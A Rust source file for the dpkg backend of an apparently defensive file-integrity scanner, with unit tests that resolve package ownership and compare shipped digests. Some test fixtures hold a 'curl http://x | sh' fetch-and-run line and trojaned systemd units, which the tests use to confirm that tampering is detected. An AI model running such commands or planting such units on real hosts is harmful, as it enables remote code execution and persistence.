//! The dpkg backend: plain text throughout, so no dependency and no shelling
//! out to `dpkg -S`, which on a compromised host is a wrapper that lies.
//!
//! Three files answer the question. `info/*.list` says which package owns a
//! path, `status` gives the version and the conffile manifest, and
//! `info/*.md5sums` gives the digest the package shipped. `diversions`
//! moves a listed path: as dpkg applies it, a path diverted by anyone but
//! the package listing it (by hand, `:`, included) holds that package's file
//! at the diverted-to name, and whatever sits at the original is not its.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use crate::entry::{Integrity, Provenance};
use crate::root::Root;

use super::{Answers, spellings};

const INFO: &str = "var/lib/dpkg/info";
const STATUS: &str = "var/lib/dpkg/status";
const DIVERSIONS: &str = "var/lib/dpkg/diversions";

/// File lists and the status database are large on a full desktop but are
/// root-owned system files; the cap is a backstop, not a parsing limit.
const DB_CAP: usize = 64 << 20;

/// The per-package files dpkg keeps in its info directory. The executable
/// ones run as root on a package operation, which is why they are collected
/// at all.
const MAINTAINER_SCRIPTS: [&str; 6] =
    ["preinst", "postinst", "prerm", "postrm", "config", "triggers"];

pub fn present(root: &Root) -> bool {
    root.exists(STATUS)
}

/// How long after a package's file list is written its other files may
/// still be landing. dpkg writes the `.list` and then installs the new files
/// in the same unpack, moments apart; a restore or an image layer extracted
/// in bulk spreads them by seconds. A file whose inode changed later than
/// this was changed after its package was installed.
pub(crate) const INSTALL_WINDOW: std::time::Duration = std::time::Duration::from_secs(120);

/// An inode's change time cannot be set from userspace, so a file dpkg
/// wrote in the same unpack as `<pkg>.list` and a file changed since are
/// told apart by it; a change well past the window is one dpkg did not
/// make. On an image copied rather than mounted the ctimes are the copy's,
/// and the comparison says nothing either way.
pub(crate) fn changed_after_install(file: std::time::SystemTime, list: std::time::SystemTime) -> Option<std::time::Duration> {
    file.duration_since(list).ok().filter(|after| *after > INSTALL_WINDOW)
}

/// Every path the file lists claim, root-relative, for a scan that asks
/// about all of them.
pub fn packaged_files(root: &Root) -> BTreeSet<PathBuf> {
    let mut out = BTreeSet::new();
    if !present(root) {
        return out;
    }
    for ent in root.read_dir_optional(INFO).unwrap_or_default() {
        let name = ent.name.to_string_lossy().into_owned();
        if !name.ends_with(".list") {
            continue;
        }
        let Ok((bytes, _)) = root.read_capped(format!("{INFO}/{name}"), DB_CAP) else { continue };
        for line in bytes.split(|b| *b == b'\n') {
            let listed = strip_slash(line);
            if !listed.is_empty() {
                out.insert(PathBuf::from(String::from_utf8_lossy(listed).into_owned()));
            }
        }
    }
    out
}

pub fn resolve(root: &Root, wanted: &BTreeSet<PathBuf>) -> Option<Answers> {
    if !present(root) {
        return None;
    }

    // Every spelling of every wanted path, mapped back to the one the caller
    // asked about, so a /lib vs /usr/lib mismatch cannot lose an answer.
    // One spelling can be the alias of several wanted paths: the moment a
    // scan asks about both `bin/sh` and `usr/bin/sh` — which it does as soon
    // as anything names /bin/sh — they alias to each other, and a map of one
    // value silently dropped whichever was inserted first. The path that lost
    // was then answered by nobody and reported Unpackaged.
    let mut alias_to_wanted: BTreeMap<PathBuf, Vec<PathBuf>> = BTreeMap::new();
    for w in wanted {
        for alias in spellings(root, w) {
            alias_to_wanted.entry(alias).or_default().push(w.clone());
        }
    }

    // The owning package, and the name its manifests list the file under.
    let mut owner: BTreeMap<PathBuf, (String, PathBuf)> = BTreeMap::new();

    // dpkg's own metadata directory is not listed in anybody's .list, so
    // every maintainer script in it reads as unpackaged — a hundred rows of
    // noise on an ordinary Debian host. The layout names the owner: the file
    // is `<package>[:<arch>].<script>` and dpkg put it there.
    for w in wanted {
        let Ok(name) = w.strip_prefix(INFO) else { continue };
        let name = name.to_string_lossy();
        let Some((stem, ext)) = name.rsplit_once('.') else { continue };
        if MAINTAINER_SCRIPTS.contains(&ext) && !stem.is_empty() {
            owner.insert(w.clone(), (stem.to_string(), w.clone()));
        }
    }

    let diverted = diversions(root);
    for ent in root.read_dir_optional(INFO).unwrap_or_default() {
        let name = ent.name.to_string_lossy().into_owned();
        let Some(pkg) = name.strip_suffix(".list") else { continue };
        let Ok((bytes, _)) = root.read_capped(format!("{INFO}/{name}"), DB_CAP) else { continue };
        for line in bytes.split(|b| *b == b'\n') {
            let listed = strip_slash(line);
            if listed.is_empty() {
                continue;
            }
            let listed = PathBuf::from(String::from_utf8_lossy(listed).into_owned());
            let on_disk = match diverted.get(&listed) {
                Some((to, by)) if by != base_name(pkg) => to,
                _ => &listed,
            };
            if let Some(ws) = alias_to_wanted.get(on_disk) {
                for w in ws {
                    owner.insert(w.clone(), (pkg.to_string(), listed.clone()));
                }
            }
        }
    }

    if owner.is_empty() {
        return Some(Answers::new());
    }

    let needed: BTreeSet<String> = owner.values().map(|(p, _)| p.clone()).collect();
    let status = read_status(root, &needed);

    let mut out = Answers::new();
    for (path, (pkg, listed)) in &owner {
        let Some(info) = status.get(pkg) else { continue };
        let integrity = verify(root, path, listed, pkg, info);
        out.insert(path.clone(), Provenance::Packaged {
            package: base_name(pkg).to_string(),
            version: info.version.clone(),
            integrity,
        });
    }
    Some(out)
}

#[derive(Default)]
struct PkgInfo {
    version: String,
    /// Path (no leading slash) to the digest dpkg shipped. A conffile is
    /// expected to differ from it; that is what a conffile is for.
    conffiles: BTreeMap<String, String>,
}

/// Streams the status file once, keeping only the packages that own
/// something the scan asked about.
fn read_status(root: &Root, needed: &BTreeSet<String>) -> BTreeMap<String, PkgInfo> {
    let mut out = BTreeMap::new();
    let Ok((bytes, _)) = root.read_capped(STATUS, DB_CAP) else { return out };
    let text = String::from_utf8_lossy(&bytes);

    let mut package = String::new();
    let mut arch = String::new();
    let mut info = PkgInfo::default();
    let mut in_conffiles = false;

    let flush = |package: &mut String, arch: &mut String, info: &mut PkgInfo, out: &mut BTreeMap<String, PkgInfo>| {
        if package.is_empty() {
            return;
        }
        let taken = std::mem::take(info);
        let qualified = format!("{package}:{arch}");
        for key in [package.clone(), qualified] {
            if needed.contains(&key) {
                out.insert(key, PkgInfo { version: taken.version.clone(), conffiles: taken.conffiles.clone() });
            }
        }
        package.clear();
        arch.clear();
    };

    for line in text.lines() {
        if line.is_empty() {
            flush(&mut package, &mut arch, &mut info, &mut out);
            in_conffiles = false;
            continue;
        }
        if line.starts_with(' ') || line.starts_with('\t') {
            if in_conffiles {
                // " /etc/ssh/sshd_config 0fd9... [obsolete]"
                let mut parts = line.split_whitespace();
                if let (Some(path), Some(digest)) = (parts.next(), parts.next()) {
                    info.conffiles.insert(strip_slash_str(path).to_string(), digest.to_string());
                }
            }
            continue;
        }
        in_conffiles = false;
        let Some((key, value)) = line.split_once(':') else { continue };
        let value = value.trim();
        match key {
            "Package" => package = value.to_string(),
            "Architecture" => arch = value.to_string(),
            "Version" => info.version = value.to_string(),
            "Conffiles" => in_conffiles = true,
            _ => {}
        }
    }
    flush(&mut package, &mut arch, &mut info, &mut out);
    out
}

/// Diverted path, to where it went and who diverted it (`:` by hand), from
/// dpkg's three-line records.
fn diversions(root: &Root) -> BTreeMap<PathBuf, (PathBuf, String)> {
    let Ok((bytes, _)) = root.read_capped(DIVERSIONS, DB_CAP) else { return BTreeMap::new() };
    let text = String::from_utf8_lossy(&bytes);
    let lines: Vec<&str> = text.lines().collect();
    lines
        .chunks(3)
        .filter_map(|c| match c {
            [from, to, by] => Some((PathBuf::from(strip_slash_str(from)), (PathBuf::from(strip_slash_str(to)), by.to_string()))),
            _ => None,
        })
        .collect()
}

/// `path` is the file on disk, `listed` the name the package's manifests
/// give it; they differ only for a diverted file.
fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) -> Integrity {
    // Digests of the file behind the path, links followed.
    let actual = super::digests(root, path);

    // A conffile is checked against the digest dpkg recorded for it, and a
    // difference is expected rather than alarming. Without this, every host
    // with an edited sshd_config lights up.
    let conffile = |p: &Path| {
        spellings(root, p).into_iter().find_map(|s| info.conffiles.get(&*s.to_string_lossy()).cloned())
    };
    if let (Some(expected), Some(actual)) = (conffile(listed), &actual) {
        return if expected.eq_ignore_ascii_case(&actual.md5) { Integrity::Intact } else { Integrity::ConffileModified };
    }

    // A symlink has no contents of its own, and dpkg records no digest for
    // one — `/bin/sh` is owned by dash and listed in its file list, but the
    // md5sums line is for `bin/dash`. Verifying through the link is what
    // makes an ordinary `#!/bin/sh` resolve instead of reporting unverifiable
    // on every script on the host.
    if root.stat(path).is_ok_and(|m| m.is_symlink) {
        if let (Ok(target), Some(actual)) = (root.read_link(path), &actual) {
            let resolved = if target.is_absolute() {
                root.rel(&target)
            } else {
                path.parent().map(|d| root.rel(&d.join(&target))).unwrap_or_else(|| root.rel(&target))
            };
            // The link may lead to a conffile, whose digest is in the status
            // file and not the md5sums: isc-dhcp-client's hook directories
            // hold links to /etc/dhcp/debug.
            if let Some(expected) = conffile(&resolved) {
                return if expected.eq_ignore_ascii_case(&actual.md5) {
                    Integrity::Intact
                } else {
                    Integrity::ConffileModified
                };
            }
            if let Some(expected) = shipped_digest(root, pkg, &resolved) {
                return if expected.eq_ignore_ascii_case(&actual.md5) {
                    Integrity::Intact
                } else {
                    Integrity::Modified
                };
            }
        }
        // A link dpkg lists but leads nowhere it digests — a unit masked to
        // /dev/null by the package that ships it, an alias into another
        // package — has one checkable property: when it changed. A link
        // repointed since install is a new inode with a later change time.
        return link_by_change_time(root, path, pkg);
    }

    let Some(actual) = actual else { return Integrity::Unknown };
    match shipped_digest(root, pkg, listed) {
        // Not every package ships md5sums, and a path may be absent from one
        // that does. Integrity is then genuinely unknown; calling it intact
        // would give false assurance about exactly the file an attacker
        // replaced.
        None => Integrity::Unknown,
        Some(expected) if expected.eq_ignore_ascii_case(&actual.md5) => Integrity::Intact,
        Some(_) => Integrity::Modified,
    }
}

fn link_by_change_time(root: &Root, link: &Path, pkg: &str) -> Integrity {
    let (Ok(link), Ok(list)) = (root.stat(link), root.stat(format!("{INFO}/{pkg}.list"))) else {
        return Integrity::Unknown;
    };
    match (link.ctime, list.ctime) {
        (Some(changed), Some(installed)) if changed_after_install(changed, installed).is_some() => Integrity::Modified,
        (Some(_), Some(_)) => Integrity::Intact,
        _ => Integrity::Unknown,
    }
}

fn shipped_digest(root: &Root, pkg: &str, path: &Path) -> Option<String> {
    let (bytes, _) = root.read_capped(format!("{INFO}/{pkg}.md5sums"), DB_CAP).ok()?;
    let aliases: Vec<String> =
        spellings(root, path).iter().map(|p| p.to_string_lossy().into_owned()).collect();
    for line in bytes.split(|b| *b == b'\n') {
        let line = String::from_utf8_lossy(line);
        let Some((digest, listed)) = line.split_once(char::is_whitespace) else { continue };
        let listed = strip_slash_str(listed.trim());
        if aliases.iter().any(|a| a == listed) {
            return Some(digest.to_string());
        }
    }
    None
}

fn base_name(pkg: &str) -> &str {
    pkg.split(':').next().unwrap_or(pkg)
}

fn strip_slash(line: &[u8]) -> &[u8] {
    let line = match line.strip_suffix(b"\r") {
        Some(l) => l,
        None => line,
    };
    line.strip_prefix(b"/").unwrap_or(line)
}

fn strip_slash_str(s: &str) -> &str {
    s.strip_prefix('/').unwrap_or(s)
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Fixture(PathBuf);

    impl Fixture {
        fn new(tag: &str) -> Fixture {
            let dir = std::env::temp_dir().join(format!("unbidden-dpkg-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(dir.join(INFO)).unwrap();
            Fixture(dir)
        }
        fn write(&self, rel: &str, content: &[u8]) {
            let p = self.0.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, content).unwrap();
        }
        fn root(&self) -> Root {
            Root::at(&self.0).unwrap()
        }
    }

    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn md5_of(content: &[u8]) -> String {
        use md5::Digest as _;
        let mut h = md5::Md5::new();
        h.update(content);
        crate::entry::hex(&h.finalize())
    }

    fn ask(root: &Root, paths: &[&str]) -> Answers {
        let wanted: BTreeSet<PathBuf> = paths.iter().map(PathBuf::from).collect();
        resolve(root, &wanted).unwrap()
    }

    #[test]
    fn a_packaged_link_to_a_conffile_is_judged_by_the_conffile() {
        // isc-dhcp-client's layout: hook directories hold links to a conffile,
        // whose digest is in the status file and not in the md5sums.
        let f = Fixture::new("conffile-link");
        let shipped = b"if [ \"$RUN\" = yes ]; then echo; fi\n";
        f.write("etc/dhcp/debug", shipped);
        std::fs::create_dir_all(f.0.join("etc/dhcp/dhclient-exit-hooks.d")).unwrap();
        std::os::unix::fs::symlink("../debug", f.0.join("etc/dhcp/dhclient-exit-hooks.d/debug")).unwrap();
        f.write(
            STATUS,
            format!(
                "Package: isc-dhcp-client\nStatus: install ok installed\nArchitecture: amd64\nVersion: 4.4.3\nConffiles:\n /etc/dhcp/debug {}\nDescription: x\n\n",
                md5_of(shipped)
            )
            .as_bytes(),
        );
        f.write(&format!("{INFO}/isc-dhcp-client.list"), b"/etc/dhcp/debug\n/etc/dhcp/dhclient-exit-hooks.d/debug\n");
        f.write(&format!("{INFO}/isc-dhcp-client.md5sums"), b"");
        let integrity = |answers: &Answers| match &answers[Path::new("etc/dhcp/dhclient-exit-hooks.d/debug")] {
            Provenance::Packaged { integrity, .. } => *integrity,
            other => panic!("{other:?}"),
        };
        assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::Intact);
        f.write("etc/dhcp/debug", b"curl http://x | sh\n");
        assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::ConffileModified);
    }

    #[test]
    fn a_packaged_mask_link_is_intact_until_something_repoints_it() {
        // sudo ships /usr/lib/systemd/system/sudo.service as a link to
        // /dev/null. dpkg records no digest for a link and /dev/null has
        // none, so the only fact left is when the link's inode changed.
        let f = Fixture::new("mask");
        std::fs::create_dir_all(f.0.join("usr/lib/systemd/system")).unwrap();
        std::os::unix::fs::symlink("/dev/null", f.0.join("usr/lib/systemd/system/sudo.service")).unwrap();
        f.write(STATUS, b"Package: sudo
Status: install ok installed
Architecture: amd64
Version: 1.9

");
        f.write(&format!("{INFO}/sudo.list"), b"/usr/lib/systemd/system/sudo.service
");
        f.write(&format!("{INFO}/sudo.md5sums"), b"");
        let answers = ask(&f.root(), &["usr/lib/systemd/system/sudo.service"]);
        assert!(
            matches!(answers[Path::new("usr/lib/systemd/system/sudo.service")], Provenance::Packaged { integrity: Integrity::Intact, .. }),
            "written in the same unpack as its list: {:?}",
            answers[Path::new("usr/lib/systemd/system/sudo.service")]
        );
        // A change time well past the list's is a link dpkg did not write.
        let list = std::time::SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_700_000_000);
        assert!(changed_after_install(list + std::time::Duration::from_secs(3_600), list).is_some());
        assert!(changed_after_install(list + std::time::Duration::from_secs(30), list).is_none());
    }

    #[test]
    fn an_edited_conffile_is_not_a_modified_package_file() {
        let f = Fixture::new("conffile");
        let shipped = b"PermitRootLogin no\n";
        f.write("etc/ssh/sshd_config", b"PermitRootLogin yes\n");
        f.write("usr/lib/systemd/system/ssh.service", b"[Service]\nExecStart=/usr/sbin/sshd\n");
        f.write(
            STATUS,
            format!(
                "Package: openssh-server\nStatus: install ok installed\nArchitecture: amd64\nVersion: 1:9.6p1-3\nConffiles:\n /etc/ssh/sshd_config {}\nDescription: x\n\n",
                md5_of(shipped)
            )
            .as_bytes(),
        );
        f.write(
            &format!("{INFO}/openssh-server.list"),
            b"/etc/ssh/sshd_config\n/usr/lib/systemd/system/ssh.service\n",
        );
        f.write(
            &format!("{INFO}/openssh-server.md5sums"),
            format!(
                "{}  usr/lib/systemd/system/ssh.service\n",
                md5_of(b"[Service]\nExecStart=/usr/sbin/sshd\n")
            )
            .as_bytes(),
        );

        let root = f.root();
        let answers = ask(&root, &["etc/ssh/sshd_config", "usr/lib/systemd/system/ssh.service"]);

        match &answers[Path::new("etc/ssh/sshd_config")] {
            Provenance::Packaged { package, version, integrity } => {
                assert_eq!(package, "openssh-server");
                assert_eq!(version, "1:9.6p1-3");
                assert_eq!(*integrity, Integrity::ConffileModified);
            }
            other => panic!("expected a packaged conffile, got {other:?}"),
        }
        assert!(matches!(
            answers[Path::new("usr/lib/systemd/system/ssh.service")],
            Provenance::Packaged { integrity: Integrity::Intact, .. }
        ));
    }

    #[test]
    fn a_trojaned_unit_file_reads_as_modified() {
        let f = Fixture::new("modified");
        f.write("usr/lib/systemd/system/cron.service", b"[Service]\nExecStart=/tmp/evil\n");
        f.write(STATUS, b"Package: cron\nArchitecture: amd64\nVersion: 3.0pl1\n\n");
        f.write(&format!("{INFO}/cron.list"), b"/usr/lib/systemd/system/cron.service\n");
        f.write(
            &format!("{INFO}/cron.md5sums"),
            format!("{}  usr/lib/systemd/system/cron.service\n", md5_of(b"[Service]\nExecStart=/usr/sbin/cron\n")).as_bytes(),
        );

        let root = f.root();
        let answers = ask(&root, &["usr/lib/systemd/system/cron.service"]);
        assert!(matches!(
            answers[Path::new("usr/lib/systemd/system/cron.service")],
            Provenance::Packaged { integrity: Integrity::Modified, .. }
        ));
    }

    #[test]
    fn a_diverted_file_is_judged_where_dpkg_put_it() {
        let f = Fixture::new("divert");
        f.write("usr/bin/man", b"#!/bin/sh\necho stub\n");
        f.write("usr/bin/man.REAL", b"man binary");
        f.write("usr/bin/podselect", b"new podselect");
        f.write("usr/bin/podselect.bundled", b"old podselect");
        f.write(DIVERSIONS, b"/usr/bin/man\n/usr/bin/man.REAL\n:\n/usr/bin/podselect\n/usr/bin/podselect.bundled\nlibpod-parser-perl\n");
        f.write(STATUS, b"Package: man-db\nVersion: 2\n\nPackage: perl\nVersion: 5\n\nPackage: libpod-parser-perl\nVersion: 1\n\n");
        f.write(&format!("{INFO}/man-db.list"), b"/usr/bin/man\n");
        f.write(&format!("{INFO}/man-db.md5sums"), format!("{}  usr/bin/man\n", md5_of(b"man binary")).as_bytes());
        f.write(&format!("{INFO}/perl.list"), b"/usr/bin/podselect\n");
        f.write(&format!("{INFO}/perl.md5sums"), format!("{}  usr/bin/podselect\n", md5_of(b"old podselect")).as_bytes());
        f.write(&format!("{INFO}/libpod-parser-perl.list"), b"/usr/bin/podselect\n");
        f.write(&format!("{INFO}/libpod-parser-perl.md5sums"), format!("{}  usr/bin/podselect\n", md5_of(b"new podselect")).as_bytes());

        let root = f.root();
        let answers = ask(&root, &["usr/bin/man", "usr/bin/man.REAL", "usr/bin/podselect", "usr/bin/podselect.bundled"]);
        assert!(!answers.contains_key(Path::new("usr/bin/man")), "what replaced a file diverted by hand is nobody's");
        let owner = |p: &str| match &answers[Path::new(p)] {
            Provenance::Packaged { package, integrity, .. } => (package.clone(), *integrity),
            other => panic!("{p}: {other:?}"),
        };
        assert_eq!(owner("usr/bin/man.REAL"), ("man-db".to_string(), Integrity::Intact));
        assert_eq!(owner("usr/bin/podselect"), ("libpod-parser-perl".to_string(), Integrity::Intact), "the diverting package keeps its own path");
        assert_eq!(owner("usr/bin/podselect.bundled"), ("perl".to_string(), Integrity::Intact));
    }

    #[test]
    fn a_package_with_no_md5sums_reports_unknown_never_intact() {
        let f = Fixture::new("nomd5");
        f.write("usr/bin/thing", b"binary");
        f.write(STATUS, b"Package: thing\nArchitecture: amd64\nVersion: 1.0\n\n");
        f.write(&format!("{INFO}/thing.list"), b"/usr/bin/thing\n");

        let root = f.root();
        let answers = ask(&root, &["usr/bin/thing"]);
        assert!(matches!(
            answers[Path::new("usr/bin/thing")],
            Provenance::Packaged { integrity: Integrity::Unknown, .. }
        ));
    }

    #[test]
    fn merged_usr_spellings_resolve_to_the_same_package() {
        let f = Fixture::new("merged");
        let body = b"[Service]\nExecStart=/usr/sbin/rsyslogd\n";
        f.write("usr/lib/systemd/system/rsyslog.service", body);
        f.write(STATUS, b"Package: rsyslog\nArchitecture: amd64\nVersion: 8.2\n\n");
        // The database records the pre-merge spelling; the scan found the
        // post-merge one.
        f.write(&format!("{INFO}/rsyslog.list"), b"/lib/systemd/system/rsyslog.service\n");
        f.write(
            &format!("{INFO}/rsyslog.md5sums"),
            format!("{}  lib/systemd/system/rsyslog.service\n", md5_of(body)).as_bytes(),
        );

        let root = f.root();
        let answers = ask(&root, &["usr/lib/systemd/system/rsyslog.service"]);
        assert!(
            matches!(
                answers[Path::new("usr/lib/systemd/system/rsyslog.service")],
                Provenance::Packaged { integrity: Integrity::Intact, .. }
            ),
            "got {:?}",
            answers[Path::new("usr/lib/systemd/system/rsyslog.service")]
        );
    }

    #[test]
    fn an_architecture_qualified_package_is_found_by_either_name() {
        let f = Fixture::new("archqual");
        f.write("usr/lib/x/libfoo.so", b"so");
        f.write(STATUS, b"Package: libfoo\nArchitecture: amd64\nVersion: 2.1\n\n");
        f.write(&format!("{INFO}/libfoo:amd64.list"), b"/usr/lib/x/libfoo.so\n");

        let root = f.root();
        let answers = ask(&root, &["usr/lib/x/libfoo.so"]);
        match &answers[Path::new("usr/lib/x/libfoo.so")] {
            Provenance::Packaged { package, version, .. } => {
                assert_eq!(package, "libfoo");
                assert_eq!(version, "2.1");
            }
            other => panic!("expected the arch-qualified package to resolve, got {other:?}"),
        }
    }

    #[test]
    fn a_maintainer_script_belongs_to_the_package_that_names_it() {
        // dpkg lists no owner for its own info directory, so without this
        // every .postinst on the host reads as attacker-authored.
        let f = Fixture::new("maintainer");
        f.write(STATUS, b"Package: openssh-server\nArchitecture: amd64\nVersion: 1:9.2p1-2\n\n");
        f.write(&format!("{INFO}/openssh-server.postinst"), b"#!/bin/sh\nsystemctl restart ssh\n");
        f.write(&format!("{INFO}/openssh-server.list"), b"/usr/sbin/sshd\n");

        let root = f.root();
        let answers = ask(&root, &[&format!("{INFO}/openssh-server.postinst")]);
        match &answers[Path::new(&format!("{INFO}/openssh-server.postinst"))] {
            Provenance::Packaged { package, .. } => assert_eq!(package, "openssh-server"),
            other => panic!("expected the naming package to own it, got {other:?}"),
        }
    }

    #[test]
    fn both_spellings_of_one_merged_usr_path_are_answered() {
        // A scan that asks about /bin/sh and /usr/bin/sh together must get an
        // answer for both. They are aliases of each other, so a lookup table
        // holding one owner per spelling loses one of them and reports a
        // perfectly ordinary shell as unpackaged.
        let f = Fixture::new("aliasboth");
        let body = b"#!/bin/dash\n";
        f.write("bin/sh", body);
        f.write(STATUS, b"Package: dash\nArchitecture: amd64\nVersion: 0.5.12\n\n");
        f.write(&format!("{INFO}/dash.list"), b"/bin/sh\n");
        f.write(&format!("{INFO}/dash.md5sums"), format!("{}  bin/sh\n", md5_of(body)).as_bytes());

        let root = f.root();
        let answers = ask(&root, &["bin/sh", "usr/bin/sh"]);
        for spelling in ["bin/sh", "usr/bin/sh"] {
            assert!(
                matches!(answers.get(Path::new(spelling)), Some(Provenance::Packaged { .. })),
                "{spelling} went unanswered: {:?}",
                answers.get(Path::new(spelling))
            );
        }
    }

    #[test]
    fn an_attacker_authored_unit_is_claimed_by_nobody() {
        let f = Fixture::new("unowned");
        f.write("etc/systemd/system/evil.service", b"[Service]\nExecStart=/tmp/x\n");
        f.write(STATUS, b"Package: cron\nArchitecture: amd64\nVersion: 3.0\n\n");
        f.write(&format!("{INFO}/cron.list"), b"/usr/sbin/cron\n");

        let root = f.root();
        let answers = ask(&root, &["etc/systemd/system/evil.service"]);
        assert!(answers.is_empty(), "the backend reports only what it can claim");

        let wanted: BTreeSet<PathBuf> = [PathBuf::from("etc/systemd/system/evil.service")].into_iter().collect();
        assert_eq!(super::super::resolve(&root, &wanted).answers[Path::new("etc/systemd/system/evil.service")], Provenance::Unpackaged);
    }
}
